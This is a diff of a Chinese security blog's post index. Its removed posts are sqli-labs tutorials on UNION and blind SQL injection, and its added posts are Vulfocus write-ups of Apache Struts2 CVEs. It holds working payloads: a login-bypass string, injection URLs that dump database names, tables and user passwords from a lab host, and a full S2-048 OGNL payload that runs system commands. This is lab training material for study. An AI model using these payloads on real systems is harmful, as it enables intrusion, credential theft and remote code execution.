-<h2 id="union操作符的介绍"><a href="#union操作符的介绍" class="headerlink" title="union操作符的介绍"></a>union操作符的介绍</h2><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的 SELECT<br>语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的<br>列的顺序必须相同。</p>
-<h3 id="SQL-UNION-语法"><a href="#SQL-UNION-语法" class="headerlink" title="SQL UNION 语法"></a>SQL UNION 语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s) FROM table_name1</span><br><span class="line">UNION</span><br><span class="line">SELECT column_name(s) FROM table_name2</span><br></pre></td></tr></table></figure>
-<p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p>
-<h3 id="SQL-UNION-ALL-语法"><a href="#SQL-UNION-ALL-语法" class="headerlink" title="SQL UNION ALL 语法"></a>SQL UNION ALL 语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s) FROM table_name1</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT column_name(s) FROM table_name2</span><br></pre></td></tr></table></figure>
-<p>另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</p>
-<h2 id="sql中的逻辑运算"><a href="#sql中的逻辑运算" class="headerlink" title="sql中的逻辑运算"></a>sql中的逻辑运算</h2><p>首先提出一个问题</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select * from users where id&#x3D;1 and 1&#x3D;1;</span><br></pre></td></tr></table></figure>
-<p>上面这条语句为什么能够选择出id=1的内容，and 1=1到底起了什么作用？这里就要清除sql语句执行顺序了。同时这个问题我们在使用万能密码的时候会用到。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select * from admin where username&#x3D;’admin’ and password&#x3D;’admin’</span><br></pre></td></tr></table></figure>
-<p>我们可以用’ or 1=1#作为密码输入。原因是为什么？这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的sql语句为：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select * from admin where username&#x3D;’admin’ and password&#x3D;’’or 1&#x3D;1#’</span><br></pre></td></tr></table></figure>
-<p><strong>Explain</strong>:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。<br>原因是在where子句后，我们可以看到三个条件语句<strong>username=’admin’ and password=’’ or 1=1</strong>。三个条件用and和or进行拼接。在sql中，我们and的运算优先级大于or的运算优先级。 因此可以看到第一个条件（用 a 表示）是真的，第二个条件（用b 表示）是假的，a and b = false,第一个条件和第二个条件执行and后是假，再与第三<br>个条件 or 运算，因为第三个条件1=1是恒成立的，所以结果自然就为真了。因此上述的语句就是恒真了<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092201.png" alt="image"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">①Select * from users where id&#x3D;1 and 1&#x3D;1;</span><br><span class="line">②Select * from users where id&#x3D;1 &amp;&amp; 1&#x3D;1;</span><br><span class="line">③Select * from users where id&#x3D;1 &amp; 1&#x3D;1;</span><br></pre></td></tr></table></figure>
-<p>上述三者有什么区别？①和②是一样的，表达的意思是 id=1 条件和 1=1 条件进行与运算</p>
-<p>③的意思是 id=1 条件与 1 进行&amp;位操作，id=1 被当作 true，与 1 进行 &amp; 运算 结果还是 1，再进行=操作，1=1,还是 1（ps：&amp;的优先级大于=）</p>
-<p>Ps:此处进行的位运算。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要<br>的时候可以利用该方法进行注入结果。例如将某一字符转换为 ascii 码后，可以分别与<br>1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是 ascii 码值。再从<br>ascii 值反推回字符。（运用较少）</p>
 ]]></content>
       <categories>
-        <category>sqli-labs靶场</category>
+        <category>APP渗透</category>
       </categories>
       <tags>
-        <tag>sqli-labs</tag>
+        <tag>APP反编译</tag>
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs靶场Less-1-4</title>
-    <url>/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-1-4/</url>
-    <content><![CDATA[<h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><h3 id="验证存在SQL注入"><a href="#验证存在SQL注入" class="headerlink" title="验证存在SQL注入"></a>验证存在SQL注入</h3><p><strong><a href="http://47.101.62.20:11567/Less-1/?id=1">http://47.101.62.20:11567/Less-1/?id=1</a></strong> 后面直接添加一个’，报错</p>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092304.png" alt="image"></p>
-<h3 id="使用order-by得到有多少字段数"><a href="#使用order-by得到有多少字段数" class="headerlink" title="使用order by得到有多少字段数"></a>使用order by得到有多少字段数</h3><p>依次请求order by 1,2,3,4直到报错。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;1%27order%20by%204--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092305.png" alt="image"></p>
-<p>证明有三个字段</p>
-<h3 id="使用union联合注入，得到能回显的字段"><a href="#使用union联合注入，得到能回显的字段" class="headerlink" title="使用union联合注入，得到能回显的字段"></a>使用union联合注入，得到能回显的字段</h3><p>请求 ?id=-1 union select 1,2,3–+</p>
-<p>id=-1为假，所以页面会执行union select 1,2,3。然后返回能回显的字段</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092306.png" alt="image"></p>
-<p>得到能回显的字段是2和3</p>
-<h3 id="查数据库中的数据"><a href="#查数据库中的数据" class="headerlink" title="查数据库中的数据"></a>查数据库中的数据</h3><h4 id="列出所有数据库"><a href="#列出所有数据库" class="headerlink" title="列出所有数据库"></a>列出所有数据库</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata--+</span><br></pre></td></tr></table></figure>
-<p>此时的SQL语句为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(schema_name),3 from information_schema.schemata--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092301.png" alt="image"></p>
-<h4 id="爆-security-数据库的数据表"><a href="#爆-security-数据库的数据表" class="headerlink" title="爆 security 数据库的数据表"></a>爆 security 数据库的数据表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema&#x3D;%27security%27--+</span><br></pre></td></tr></table></figure>
-<p>此时的SQL语句为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092302.png" alt="image"></p>
-<h4 id="爆-users-表的列"><a href="#爆-users-表的列" class="headerlink" title="爆 users 表的列"></a>爆 users 表的列</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27--+</span><br></pre></td></tr></table></figure>
-<p>此时的SQL语句为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’users’--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092303.png" alt="image"></p>
-<h4 id="爆-users表中username和password的值"><a href="#爆-users表中username和password的值" class="headerlink" title="爆 users表中username和password的值"></a>爆 users表中username和password的值</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,username,password%20from%20users%20where%20id&#x3D;2--+</span><br></pre></td></tr></table></figure>
-<p>此时的SQL语句为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,username,password from users where id&#x3D;2--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092307.png" alt="image"></p>
-<h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2><p>可以成功注入的有：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;1</span><br><span class="line">or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
-<p>其余的ppayload于less1中一致，只需要将less1中的’去掉即可</p>
-<h2 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h2><p>可以成功注入的有：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">) or &#39;1&#39;&#x3D;(&#39;1&#39; </span><br><span class="line">) or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
-<p>其余的ppayload于less1中一致，只需要将less1中的’换成’)即可</p>
-<h2 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h2><p>这里id参数使用了””和()包装</p>
-<p>可以成功注入的有：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">“) or ”1”&#x3D;(“1</span><br><span class="line">“) or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
-<p>其余的ppayload于less1中一致，只需要将less1中的’换成”)即可</p>
+    <title>S2-046 CVE-2017-5638复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p>
+<a id="more"></a>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
+<li><p>使用vulfocus启动环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081405.png" alt="image"></p>
+</li>
+<li><p>直接使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081406.png" alt="image"></p>
+</li>
+</ol>
 ]]></content>
       <categories>
-        <category>sqli-labs靶场</category>
+        <category>vulfocus靶场练习</category>
       </categories>
       <tags>
-        <tag>sqli-labs</tag>
+        <tag>Struts2</tag>
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs-Background-2 盲注</title>
-    <url>/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs-Background-2%20%E7%9B%B2%E6%B3%A8(%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3)/</url>
-    <content><![CDATA[<h2 id="什么是盲注？"><a href="#什么是盲注？" class="headerlink" title="什么是盲注？"></a>什么是盲注？</h2><blockquote>
-<p>盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显<br>到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p>
-</blockquote>
-<p>从background-1 中，我们可以知道盲注分为三类 <strong>基于布尔SQL盲注、基于时间的SQL盲注、基于报错的SQL盲注</strong>。</p>
-<h2 id="基于布尔SQL盲注——构造逻辑判断"><a href="#基于布尔SQL盲注——构造逻辑判断" class="headerlink" title="基于布尔SQL盲注——构造逻辑判断"></a>基于布尔SQL盲注——构造逻辑判断</h2><h3 id="mid-函数"><a href="#mid-函数" class="headerlink" title="mid()函数"></a>mid()函数</h3><p>此函数为截取字符串一部分。<strong>MID(column_name,start[,length])</strong></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>column_name</td>
-<td>必需。要提取字符的字段</td>
-</tr>
-<tr>
-<td>start</td>
-<td>必需。规定开始位置（起始值是 1）</td>
-</tr>
-<tr>
-<td>length</td>
-<td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本</td>
-</tr>
-</tbody></table>
-<p>示例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MID(DATABASE(),1,1)&gt;’a’     &#x2F;&#x2F;数据库名第一位</span><br><span class="line">MID(DATABASE(),2,1)         &#x2F;&#x2F;数据库名第二位</span><br></pre></td></tr></table></figure>
-<p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema&#x3D;0xxxxxxx LIMIT 0,1),1,1)&gt;’a’</span><br></pre></td></tr></table></figure>
-<p>此处column_name参数可以为sql语句，可自行构造sql语句进行注入。</p>
-<h3 id="substr-函数和substring-函数"><a href="#substr-函数和substring-函数" class="headerlink" title="substr()函数和substring()函数"></a>substr()函数和substring()函数</h3><p><strong>Substr()</strong> 和 <strong>substring()</strong> 函数实现的功能是一样的，均为截取字符串。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string substring(string, start, length)</span><br><span class="line">string substr(string, start, length)</span><br></pre></td></tr></table></figure>
+    <title>S2-019 CVE-2013-4316复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li>使用vulfocus启动环境打开url<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li>
+<li>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li>
+</ol>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-048 CVE-2017-9791复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081407.png" alt="image"></p>
+</li>
+<li><p>随意输入内容，使用burp抓取“submit”的数据包</p>
+</li>
+<li><p>poc利用</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
 
-<p>参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</p>
-<p>示例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr(DATABASE(),1,1)&gt;’a’  &#x2F;&#x2F;数据库名第一位</span><br><span class="line">substr(DATABASE(),2,1)      &#x2F;&#x2F;数据库名第二位</span><br></pre></td></tr></table></figure>
-<p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema&#x3D;0xxxxxxx LIMIT 0,1),1,1)&gt;’a’</span><br></pre></td></tr></table></figure>
-<p>此处string参数可以为sql语句，可自行构造sql语句进行注入。</p>
-<h3 id="left-函数"><a href="#left-函数" class="headerlink" title="left()函数"></a>left()函数</h3><p><strong>Left()</strong> 得到字符串左部指定个数的字符</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">left(string,n)        &#x2F;&#x2F;string为要截取的字符串，n为长度。</span><br></pre></td></tr></table></figure>
-<p>示例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">left(database(),1)&gt;&#39;a&#39;</span><br></pre></td></tr></table></figure>
-<p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p>
-<p>同样的，string可以为自行构造的SQL语句</p>
-<h3 id="ORD-函数和ascii-函数"><a href="#ORD-函数和ascii-函数" class="headerlink" title="ORD()函数和ascii()函数"></a>ORD()函数和ascii()函数</h3><p>返回第一个字符的ASCII码，经常与上面的函数进行组合使用。</p>
-<p>示例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ORD(MID(DATABASE(),1,1))&gt;114</span><br><span class="line">ascii(MID(DATABASE(),1,1))&gt;114</span><br></pre></td></tr></table></figure>
-<p>意为检测<strong>database()</strong> 的第一位<strong>ASCII</strong>码是否大于114，也即是‘r’</p>
-<h3 id="regexp-函数"><a href="#regexp-函数" class="headerlink" title="regexp()函数"></a>regexp()函数</h3><p>正则注入此处不做详解可参考文章<br><a href="https://www.cnblogs.com/lcamry/articles/5717442.html">https://www.cnblogs.com/lcamry/articles/5717442.html</a></p>
-<h2 id="基于报错的SQL盲注——构造payload让信息通过错误提示回显出来"><a href="#基于报错的SQL盲注——构造payload让信息通过错误提示回显出来" class="headerlink" title="基于报错的SQL盲注——构造payload让信息通过错误提示回显出来"></a>基于报错的SQL盲注——构造payload让信息通过错误提示回显出来</h2><p><a href="https://bugs.mysql.com/bug.php?id=8652">mysql-bug #8652</a></p>
-<p>BUG #8652的主要内容就是在同时使用<strong>RAND()**函数，聚集函数</strong>COUNT()<strong>和</strong>GROUP BY**子句进行操作时会返回duplicate key 错误，而这个错误将会披露关键信息</p>
-<p>详细原理可以参考这篇文章：<a href="https://blog.csdn.net/weixin_43249758/article/details/104168777">https://blog.csdn.net/weixin_43249758/article/details/104168777</a></p>
-<h2 id="基于时间的SQL盲注——延时注入"><a href="#基于时间的SQL盲注——延时注入" class="headerlink" title="基于时间的SQL盲注——延时注入"></a>基于时间的SQL盲注——延时注入</h2><p>使用sleep()函数<br>示例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</span><br></pre></td></tr></table></figure>
-<p>if判断语句，条件为假，执行sleep</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sleep(find_in_set(mid(@@version, 1, 1),&#39;0,1,2,3,4,5,6,7,8,9,.&#39;));</span><br></pre></td></tr></table></figure>
-<p>该语句意思是在 0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081408.png" alt="image"></p>
+<p>或直接使用工具<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>
 ]]></content>
       <categories>
-        <category>sqli-labs靶场</category>
+        <category>vulfocus靶场练习</category>
       </categories>
       <tags>
-        <tag>sqli-labs</tag>
+        <tag>Struts2</tag>
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs靶场Less-5(布尔盲注)</title>
-    <url>/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/</url>
-    <content><![CDATA[<h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><blockquote>
-<p>我们从这这一关开始学习盲注。结合 background-2 的信息，将上述能使用的 payload 展示<br>一下使用方法。</p>
-</blockquote>
-<p>这里说一下，有很多的 blog 是翻译或者 copy 的，这关正确的思路是盲注。从源代码中可以<br>看到，运行返回结果正确的时候只返回 you are in….，不会返回数据库当中的信息了，<br>所以我们不能利用上述 less1-4 的方法</p>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092308.png" alt="image"></p>
-<h3 id="利用left-函数注入"><a href="#利用left-函数注入" class="headerlink" title="利用left()函数注入"></a>利用left()函数注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(version(),1)&#x3D;5--+</span><br></pre></td></tr></table></figure>
-<p>查看一下 version()，数据库的版本号为 5.6.17，这里的语句的意思是看版本号的第一位是<br>不是 5，明显的返回的结果是正确的。</p>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092309.png" alt="image"></p>
-<p>当版本号不对的时候，则显示为空</p>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092310.png" alt="image"></p>
-<p>猜测数据库长度，已知数据库长度为8</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(length(database()),1)&#x3D;8--+  &#x2F;&#x2F;length(database())得到数据库的长度</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092311.png" alt="image"></p>
-<p>猜测数据库第一位</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(database(),1)%3E%27a%27--+</span><br></pre></td></tr></table></figure>
-<p>Database()为 security，所以我们看他的第一位是否 &gt; a,很明显的是 s &gt; a,因此返回正确。当我们不知情的情况下，可以用二分法来提高注入的效率。</p>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092312.png" alt="image"></p>
-<p>猜测数据库第二位，得知第一位是s，我们看前两位是否大于sa</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(database(),2)%3E%27sa%27--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092313.png" alt="image"></p>
-<p>往下的举一反三。即可得到完整的数据库名</p>
-<h3 id="利用substr-ascii-注入"><a href="#利用substr-ascii-注入" class="headerlink" title="利用substr()ascii()注入"></a>利用substr()ascii()注入</h3><p>根据以上得知数据库名为 security，那我们利用此方式获取 security 数据库下的表。<br>获取 security 数据库的第一个表的第一个字符</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%200,1),1,1))&gt;101--+</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>此处 table_schema 可以写成 =’security’，但是我们这里使用的 database()，是因<br>为此处 database()就是 security。此处同样的使用二分法进行测试，直到测试正确为止，此处应该是 101，因为第一个表示 email。</p>
-</blockquote>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092314.png" alt="image"></p>
-<p>如何获取第一个表的第二位字符呢？<br>这里我们已经了解了 substr()函数，这里使用 substr(**,2,1)即可</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%200,1),2,1))&gt;101--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092315.png" alt="image"></p>
-<p>那如何获取第二个表呢？思考一下！<br>这里可以看到我们上述的语句中使用的 limit 0,1. 意思就是从第 0 个开始，获取第一个。那要获取第二个是不是就是 limit 1,1！</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%201,1),1,1))&gt;113--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092316.png" alt="image"></p>
-<p>以后的过程就是不断的重复上面的，这里就不重复造轮子了。原理已经解释清楚了。<br>当你按照方法运行结束后，就可以获取到所有的表的名字</p>
-<h3 id="利用regexp获取users表中的列"><a href="#利用regexp获取users表中的列" class="headerlink" title="利用regexp获取users表中的列"></a>利用regexp获取users表中的列</h3><p>sql语句</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1)</span><br></pre></td></tr></table></figure>
-<p>payload请求</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%201&#x3D;(select%201%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20and%20table_name%20regexp%20%27^us[a-z]%27%20limit%200,1)--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092317.png" alt="image"></p>
-<p>上述语句时选择 users 表中的列名是否有 us**的列</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%201&#x3D;(select%201%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20and%20column_name%20regexp%20%27^username%27%20limit%200,1)--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092318.png" alt="image"></p>
-<p>上图中可以看到 username 存在。我们可以将 username 换成 password 等其他的项也是正确的</p>
-<h3 id="利用ord-函数和mid-函数获取users表的内容"><a href="#利用ord-函数和mid-函数获取users表的内容" class="headerlink" title="利用ord()函数和mid()函数获取users表的内容"></a>利用ord()函数和mid()函数获取users表的内容</h3><p>sql语句</p>
